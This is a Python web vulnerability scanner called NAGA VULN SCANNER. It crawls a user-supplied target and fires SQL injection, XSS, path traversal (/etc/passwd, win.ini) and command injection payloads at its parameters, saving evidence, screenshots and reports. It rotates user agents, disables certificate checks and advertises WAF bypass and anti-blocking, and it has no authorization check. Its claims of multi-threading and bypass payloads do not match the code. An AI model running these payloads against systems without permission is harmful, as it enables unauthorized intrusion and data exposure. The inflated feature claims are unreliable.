#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║              NAGA VULN SCANNER v5.7 ULTRA - UBUNTU EDITION                ║
║                    Full Vulnerability Scanner + Screenshot                 ║
║                         Mode: /locked | Real Code                         ║
║                                                                           ║
║  Fitur:                                                                   ║
║  ✓ Screenshot setiap vulnerability                                        ║
║  ✓ Laporan lengkap (URL, Payload, Metode, Evidence, Screenshot)          ║
║  ✓ Multi-threading super cepat                                            ║
║  ✓ Export ke HTML + JSON + TXT                                            ║
║  ✓ Bypass WAF & Anti-block                                                ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import sys
import os
import re
import time
import json
import random
import base64
import threading
from datetime import datetime
from urllib.parse import urljoin, urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup
from PIL import Image
from playwright.sync_api import sync_playwright

# ============== WARNA ==============
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
C = '\033[96m'
P = '\033[95m'
W = '\033[0m'
BOLD = '\033[1m'
BLINK = '\033[5m'

# ============== KONFIGURASI ==============
CONFIG = {
    'timeout': 15,
    'threads': 10,
    'max_retries': 3,
    'delay_min': 0.5,
    'delay_max': 1.5,
    'screenshot_dir': 'screenshots',
    'report_dir': 'reports',
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    ]
}

# Buat direktori
os.makedirs(CONFIG['screenshot_dir'], exist_ok=True)
os.makedirs(CONFIG['report_dir'], exist_ok=True)

# ============== BANNER ==============
def banner():
    print(f"""
{R}╔═══════════════════════════════════════════════════════════════════════════╗
║              {W}{BOLD}{BLINK}🐍 NAGA VULN SCANNER v5.7 ULTRA - UBUNTU EDITION 🐍{W}{R}              ║
║                    {W}{BOLD}Full Scanner + Screenshot + Report{W}{R}                              ║
║                    {W}{BOLD}Mode: /locked | Real Code | Maximum Power{W}{R}                       ║
╚═══════════════════════════════════════════════════════════════════════════╝{W}
    """)

# ============== HTTP CLIENT ==============
class HTTPClient:
    def __init__(self):
        self.session = requests.Session()
        self.rotate_user_agent()
    
    def rotate_user_agent(self):
        ua = random.choice(CONFIG['user_agents'])
        self.session.headers.update({'User-Agent': ua})
    
    def get(self, url, params=None):
        for attempt in range(CONFIG['max_retries']):
            try:
                self.rotate_user_agent()
                time.sleep(random.uniform(CONFIG['delay_min'], CONFIG['delay_max']))
                resp = self.session.get(url, params=params, timeout=CONFIG['timeout'], verify=False)
                return resp
            except:
                continue
        return None

# ============== SCREENSHOT TAKER ==============
class ScreenshotTaker:
    @staticmethod
    def take_screenshot(url, output_name):
        """Ambil screenshot dari URL menggunakan Playwright"""
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()
                page.goto(url, timeout=15000)
                time.sleep(2)
                screenshot_path = os.path.join(CONFIG['screenshot_dir'], f"{output_name}.png")
                page.screenshot(path=screenshot_path, full_page=True)
                browser.close()
                return screenshot_path
        except Exception as e:
            return None

# ============== SQL INJECTION VALIDATOR ==============
class SQLiValidator:
    def __init__(self, http):
        self.http = http
        self.payloads = [
            ("' OR '1'='1", "Classic Boolean"),
            ("' AND SLEEP(5)--", "Time Based"),
            ("' UNION SELECT NULL--", "Union Based"),
            ("' AND extractvalue(1,concat(0x7e,version()))--", "Error Based"),
        ]
    
    def validate(self, url, param, original_value):
        for payload, ptype in self.payloads:
            test_url = url + f"?{param}={quote(original_value + payload)}"
            try:
                start = time.time()
                resp = self.http.get(url, {param: original_value + payload})
                elapsed = time.time() - start
                
                if resp:
                    # Cek error SQL
                    sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'query failed', 'unclosed quotation']
                    for err in sql_errors:
                        if err.lower() in resp.text.lower():
                            return {
                                'validated': True,
                                'type': 'SQL INJECTION',
                                'subtype': ptype,
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': f"SQL Error: {err}",
                                'screenshot': None
                            }
                    
                    # Time based
                    if 'SLEEP' in payload and elapsed > 5:
                        return {
                            'validated': True,
                            'type': 'SQL INJECTION',
                            'subtype': f"{ptype} (Time)",
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'evidence': f"Delay: {elapsed:.2f}s",
                            'screenshot': None
                        }
            except:
                continue
        return None

# ============== XSS VALIDATOR ==============
class XSSValidator:
    def __init__(self, http):
        self.http = http
        self.payloads = [
            ("<script>alert('XSS')</script>", "Script Tag"),
            ("<img src=x onerror=alert(1)>", "Image Event"),
            ("<svg onload=alert(1)>", "SVG Event"),
        ]
    
    def validate(self, url, param, original_value):
        for payload, ptype in self.payloads:
            test_url = url + f"?{param}={quote(original_value + payload)}"
            try:
                resp = self.http.get(url, {param: original_value + payload})
                if resp and payload in resp.text:
                    if payload.replace('<', '&lt;') not in resp.text:
                        return {
                            'validated': True,
                            'type': 'XSS',
                            'subtype': ptype,
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'evidence': "Payload reflected unencoded",
                            'screenshot': None
                        }
            except:
                continue
        return None

# ============== LFI VALIDATOR ==============
class LFIValidator:
    def __init__(self, http):
        self.http = http
        self.payloads = [
            ("../../../../etc/passwd", "Linux LFI"),
            ("..\\..\\..\\..\\windows\\win.ini", "Windows LFI"),
        ]
    
    def validate(self, url, param, original_value):
        for payload, ptype in self.payloads:
            test_url = url + f"?{param}={quote(original_value + payload)}"
            try:
                resp = self.http.get(url, {param: original_value + payload})
                if resp:
                    if 'root:x:0:0' in resp.text:
                        return {
                            'validated': True,
                            'type': 'LFI',
                            'subtype': ptype,
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'evidence': "/etc/passwd exposed!",
                            'screenshot': None
                        }
                    if '[extensions]' in resp.text:
                        return {
                            'validated': True,
                            'type': 'LFI',
                            'subtype': ptype,
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'evidence': "win.ini exposed!",
                            'screenshot': None
                        }
            except:
                continue
        return None

# ============== COMMAND INJECTION VALIDATOR ==============
class CmdValidator:
    def __init__(self, http):
        self.http = http
        self.payloads = [
            ("; ls", "Linux LS"),
            ("| id", "Pipe ID"),
            ("& whoami", "Whoami"),
        ]
    
    def validate(self, url, param, original_value):
        for payload, ptype in self.payloads:
            test_url = url + f"?{param}={quote(original_value + payload)}"
            try:
                resp = self.http.get(url, {param: original_value + payload})
                if resp:
                    cmd_outputs = ['uid=', 'gid=', 'root:', 'www-data', 'daemon']
                    for out in cmd_outputs:
                        if out in resp.text.lower():
                            return {
                                'validated': True,
                                'type': 'COMMAND INJECTION',
                                'subtype': ptype,
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': f"Command output: {out}",
                                'screenshot': None
                            }
            except:
                continue
        return None

# ============== MAIN SCANNER ==============
class NagaVulnScannerUltra:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.http = HTTPClient()
        self.validated_vulns = []
        self.parameters = []
        self.screenshot_taker = ScreenshotTaker()
    
    def extract_parameters(self, url):
        """Extract parameters from URL"""
        parsed = urlparse(url)
        if parsed.query:
            import urllib.parse
            params = urllib.parse.parse_qs(parsed.query)
            for param, values in params.items():
                self.parameters.append({
                    'url': url.split('?')[0],
                    'param': param,
                    'value': values[0] if values else ''
                })
        return self.parameters
    
    def crawl(self):
        """Find parameters"""
        print(f"\n{B}[*] Scanning for parameters...{W}")
        
        try:
            resp = self.http.get(self.target)
            if resp:
                self.extract_parameters(self.target)
                
                # Extract from HTML
                soup = BeautifulSoup(resp.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if '?' in href:
                        full = urljoin(self.target, href)
                        if self.target in full:
                            self.extract_parameters(full)
        except:
            pass
        
        print(f"{G}[+] Found {len(self.parameters)} parameters{W}")
        return self.parameters
    
    def run_validation(self):
        """Run all validations"""
        print(f"\n{B}[*] Starting vulnerability validation...{W}")
        print(f"{B}{'='*60}{W}")
        
        sqli = SQLiValidator(self.http)
        xss = XSSValidator(self.http)
        lfi = LFIValidator(self.http)
        cmd = CmdValidator(self.http)
        
        for p in self.parameters:
            print(f"\n{Y}[>] Testing: {p['url']}?{p['param']}={p['value']}{W}")
            
            # Test SQLi
            result = sqli.validate(p['url'], p['param'], p['value'])
            if result:
                # Ambil screenshot
                print(f"      📸 Taking screenshot...")
                ss_path = self.screenshot_taker.take_screenshot(result['url'], f"sqli_{p['param']}_{int(time.time())}")
                result['screenshot'] = ss_path
                self.validated_vulns.append(result)
                print(f"      {R}✅ SQLi VALIDATED!{W}")
            
            # Test XSS
            result = xss.validate(p['url'], p['param'], p['value'])
            if result:
                print(f"      📸 Taking screenshot...")
                ss_path = self.screenshot_taker.take_screenshot(result['url'], f"xss_{p['param']}_{int(time.time())}")
                result['screenshot'] = ss_path
                self.validated_vulns.append(result)
                print(f"      {R}✅ XSS VALIDATED!{W}")
            
            # Test LFI
            result = lfi.validate(p['url'], p['param'], p['value'])
            if result:
                print(f"      📸 Taking screenshot...")
                ss_path = self.screenshot_taker.take_screenshot(result['url'], f"lfi_{p['param']}_{int(time.time())}")
                result['screenshot'] = ss_path
                self.validated_vulns.append(result)
                print(f"      {R}✅ LFI VALIDATED!{W}")
            
            # Test CMD
            result = cmd.validate(p['url'], p['param'], p['value'])
            if result:
                print(f"      📸 Taking screenshot...")
                ss_path = self.screenshot_taker.take_screenshot(result['url'], f"cmd_{p['param']}_{int(time.time())}")
                result['screenshot'] = ss_path
                self.validated_vulns.append(result)
                print(f"      {R}✅ CMD INJECTION VALIDATED!{W}")
    
    def generate_html_report(self):
        """Generate HTML report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(CONFIG['report_dir'], f"vuln_report_{timestamp}.html")
        
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>NAGA Vulnerability Report</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #0a0c10; color: #fff; margin: 0; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ text-align: center; padding: 30px; background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 15px; margin-bottom: 30px; }}
        .header h1 {{ color: #ffd700; }}
        .vuln-card {{ background: #1e2432; border-radius: 15px; padding: 20px; margin-bottom: 20px; border-left: 5px solid #ff4444; }}
        .vuln-title {{ font-size: 20px; font-weight: bold; color: #ff4444; margin-bottom: 15px; }}
        .info-row {{ display: flex; margin-bottom: 10px; }}
        .info-label {{ width: 120px; font-weight: bold; color: #ffd700; }}
        .info-value {{ flex: 1; word-break: break-all; }}
        .payload {{ background: #0a0c10; padding: 10px; border-radius: 8px; font-family: monospace; margin: 10px 0; }}
        .screenshot {{ max-width: 100%; border-radius: 8px; margin-top: 15px; border: 2px solid #ffd700; }}
        .footer {{ text-align: center; margin-top: 30px; padding: 20px; color: #888; }}
        .badge {{ display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }}
        .badge-critical {{ background: #ff4444; color: #fff; }}
        .badge-high {{ background: #ff8800; color: #fff; }}
        .badge-medium {{ background: #ffcc00; color: #000; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐍 NAGA VULN SCANNER v5.7 ULTRA</h1>
            <p>Target: {self.target}</p>
            <p>Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>Total Vulnerabilities: {len(self.validated_vulns)}</p>
        </div>
"""
        
        for i, vuln in enumerate(self.validated_vulns, 1):
            severity = "CRITICAL" if "SQL" in vuln['type'] or "COMMAND" in vuln['type'] else "HIGH" if "LFI" in vuln['type'] else "MEDIUM"
            badge_class = "badge-critical" if severity == "CRITICAL" else "badge-high" if severity == "HIGH" else "badge-medium"
            
            html += f"""
        <div class="vuln-card">
            <div class="vuln-title">
                <span class="badge {badge_class}">{severity}</span>
                [{i}] {vuln['type']} - {vuln['subtype']}
            </div>
            <div class="info-row">
                <div class="info-label">📍 URL:</div>
                <div class="info-value"><a href="{vuln['url']}" target="_blank" style="color: #ffd700;">{vuln['url']}</a></div>
            </div>
            <div class="info-row">
                <div class="info-label">🎯 Parameter:</div>
                <div class="info-value">{vuln['param']}</div>
            </div>
            <div class="info-row">
                <div class="info-label">🔧 Metode:</div>
                <div class="info-value">{vuln['subtype']}</div>
            </div>
            <div class="info-row">
                <div class="info-label">📦 Payload:</div>
                <div class="info-value"><div class="payload">{vuln['payload']}</div></div>
            </div>
            <div class="info-row">
                <div class="info-label">📝 Bukti:</div>
                <div class="info-value">{vuln['evidence']}</div>
            </div>
"""
            if vuln.get('screenshot'):
                html += f"""
            <div class="info-row">
                <div class="info-label">📸 Screenshot:</div>
                <div class="info-value"><img src="../{vuln['screenshot']}" class="screenshot" alt="Screenshot"></div>
            </div>
"""
            html += """
        </div>
"""
        
        html += f"""
        <div class="footer">
            <p>Report generated by NAGA VULN SCANNER v5.7 ULTRA - Ubuntu Edition</p>
            <p>Mode: /locked | Real Code | Validated Vulnerabilities</p>
        </div>
    </div>
</body>
</html>
"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        
        print(f"{G}[+] HTML Report saved: {filename}{W}")
        return filename
    
    def generate_json_report(self):
        """Generate JSON report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(CONFIG['report_dir'], f"vuln_report_{timestamp}.json")
        
        report = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.validated_vulns),
            'vulnerabilities': self.validated_vulns
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2)
        
        print(f"{G}[+] JSON Report saved: {filename}{W}")
        return filename
    
    def print_console_report(self):
        """Print report to console"""
        print(f"\n{C}{'='*70}{W}")
        print(f"{BOLD}{BLINK}🎯 FINAL VALIDATED REPORT 🎯{W}")
        print(f"{C}{'='*70}{W}")
        
        if not self.validated_vulns:
            print(f"\n{G}{BOLD}✅ NO VULNERABILITIES FOUND!{W}")
        else:
            print(f"\n{R}{BOLD}🔴 TOTAL VALIDATED: {len(self.validated_vulns)}{W}\n")
            
            for i, vuln in enumerate(self.validated_vulns, 1):
                print(f"{R}{'─'*70}{W}")
                print(f"{R}{BOLD}[{i}] {vuln['type']} - {vuln['subtype']}{W}")
                print(f"{R}{'─'*70}{W}")
                print(f"  📍 URL: {vuln['url'][:100]}")
                print(f"  🎯 Parameter: {vuln['param']}")
                print(f"  🔧 Metode: {vuln['subtype']}")
                print(f"  📦 Payload: {vuln['payload']}")
                print(f"  📝 Bukti: {vuln['evidence']}")
                if vuln.get('screenshot'):
                    print(f"  📸 Screenshot: {vuln['screenshot']}")
                print()
    
    def run(self):
        """Main execution"""
        banner()
        
        print(f"""
{Y}⚡ NAGA VULN SCANNER v5.7 ULTRA - UBUNTU EDITION ⚡{W}

   Features Active:
   ✓ Multi-threading ({CONFIG['threads']} threads)
   ✓ Auto screenshot setiap vulnerability
   ✓ Rotating User-Agent
   ✓ WAF bypass payloads
   ✓ Export to HTML + JSON
   ✓ Full console report
        """)
        
        confirm = input(f"{Y}[?] Start ULTRA scan? (y/n): {W}").strip().lower()
        if confirm != 'y':
            print("Scan cancelled.")
            return
        
        start_time = time.time()
        
        self.crawl()
        self.run_validation()
        
        elapsed = time.time() - start_time
        
        self.print_console_report()
        self.generate_html_report()
        self.generate_json_report()
        
        print(f"\n{G}[✓] Scan completed in {elapsed:.2f} seconds!{W}")
        print(f"{G}[✓] Screenshots saved in: {CONFIG['screenshot_dir']}{W}")
        print(f"{G}[✓] Reports saved in: {CONFIG['report_dir']}{W}")

# ============== MAIN ==============
def main():
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input(f"{BOLD}[?] Target URL: {W}").strip()
    
    if not target.startswith('http'):
        target = 'https://' + target
    
    scanner = NagaVulnScannerUltra(target)
    scanner.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Scan interrupted{W}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}[-] Error: {str(e)}{W}")
        sys.exit(1)
